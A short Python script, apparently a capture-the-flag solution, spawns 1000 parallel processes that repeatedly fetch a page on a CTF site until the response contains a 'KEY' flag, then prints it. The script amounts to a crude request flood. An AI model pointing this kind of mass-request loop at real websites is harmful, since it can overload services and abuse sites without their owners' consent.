from multiprocessing import Pool
import requests as r
import os

N = 1000
URL = 'http://ctf.slothparadise.com/about.php'
IDs = range(N)

def reload(i):
    get = r.get(URL)
    print(str(i) + ' Reloads')
    if 'KEY' in get.text:
        print(get.text)
        os._exit(1)

if __name__ == '__main__':
    pool = Pool(N)
    pool.map(reload, IDs)